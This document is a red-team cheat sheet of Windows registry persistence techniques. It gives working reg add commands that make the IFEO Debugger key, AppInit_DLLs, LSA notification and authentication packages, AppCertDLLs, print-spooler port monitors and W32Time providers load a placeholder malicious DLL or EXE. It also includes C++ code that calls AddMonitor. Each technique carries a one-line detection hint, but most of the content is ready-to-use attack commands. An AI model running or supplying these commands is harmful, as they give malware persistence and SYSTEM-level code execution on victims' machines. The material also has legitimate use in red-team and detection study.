# Fix needed

## Debugger


#### Example:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C C:\Windows\System32\calc.exe & c:\path\to\badguy.exe" /f
```

Add command in **HKLM** reg,  that will execute your **badguy.exe**  

#### Detection:
User can see malicious string in reg **HKLM**


</br></br>


## AppInit

#### Example:
##### For x64 programs:
```powershell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f

reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\badguy64.dll" /f

```

##### For x32 programs:
```powershell
reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f

reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\badguy32.dll" /f
```

Turn LoadAppInit_DLLs to 1 and add in AppInit_DLLs path to malware.

#### Detection:

User can see that value of **LoadAppInit_DLLs** at *HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows* or  *HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows* is set to 1 and also can see malicious string at the same path in  **AppInit_DLLs**.


</br></br>

## System process Lsass

#### Example:
```powershell
reg add "HKLM\system\currentcontrolset\control\lsa" /v "Notification Packages" /t reg_multi_sz /d "c:\path\to\badguy.dll" /f

```
Just add a library for *Lsass* process

#### Detection:
User can see malicious string in reg **HKLM**

</br></br>

## AppCert DLLs

   #### Example:
```powershell
reg add "HKLM\System\CurrentControlSet\Control\Session Manager" /v AppCertDLLs /t REG_SZ /d "C:\path\to\badguy.dll"

```
*badguy.dll* loads when Windows uses Api functions like: *CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, WinExec*.



#### Detection:
User can see malicious string in reg **HKLM**

</br></br>

## Authentification Packages

#### Example:
```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages" /v persistence /t REG_SZ /d "C:\path\to\badguy.exe"

```

*badguy.exe* executes when system loads packets **Authentication Pack** on system startup
#### Detection:
User can see malicious string in reg **HKLM**

</br></br>

## Port Monitors
The Print Spooler service is responsible for managing printing jobs in OS Windows. Interaction with the service is performed through the Print Spooler API which contains a function (**AddMonitor**) that can be used to install local port monitors and connect the configuration, data and monitor files. This function has the ability to inject a DLL into the **spoolsv.exe** process and by creating a registry key red team operators can achieve persistence on the system. 

*refers:* 
* https://pentestlab.blog/2019/10/28/persistence-port-monitors/
* https://www.ired.team/offensive-security/persistence/t1013-addmonitor#execution


#### Example:
compile this cpp file, where *badguy.dll* your payload
```C++
#include "stdafx.h"
#include "Windows.h"

int main() {	
	MONITOR_INFO_2 monitorInfo;
	TCHAR env[12] = TEXT("Windows x64");
	TCHAR name[12] = TEXT("evilMonitor");
	TCHAR dll[12] = TEXT("badguy.dll");
	monitorInfo.pName = name;
	monitorInfo.pEnvironment = env;
	monitorInfo.pDLLName = dll;
	AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
	return 0;
}
```

Move **badguy.dll** and your compiled binary to *%systemroot%* folder

```powershell
copy C:\path\to\badguy.dll %systemroot%
copy C:\path\to\your_binary.exe %systemroot%
```
Start your binary.

Add your dll to registry
```powershell
reg add "hklm\system\currentcontrolset\control\print\monitors\persistence" /v "Driver" /d "badguy.dll" /t REG_SZ
```
With every system startup the *spoolsv.exe* process will load all the driver DLL files that exist in the Monitors registry key and stored in System32 folder.

#### Detection:

User can see malicious string in reg **HKLM**

</br></br>

## Time providers

 Time providers are implemented in the form of a DLL file which resides in System32 folder. The service **W32Time** initiates during the startup of Windows and loads the w32time.dll. Since the associated service is starting automatically during Windows startup, it can be used as a persistence mechanism.
 
 
```powershell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" /v DllName /t REG_SZ /d "C:\path\to\badguy.dll"
```

Add *badguy.dll* to *W32Time* Timeprovider service. NtpClient starts with system for time synsynchronization and will execute your *dll*.

*refer: https://pentestlab.blog/2019/10/22/persistence-time-providers/*

#### Detection:

User can see malicious **dll** in reg of **W32Time**

</br></br>
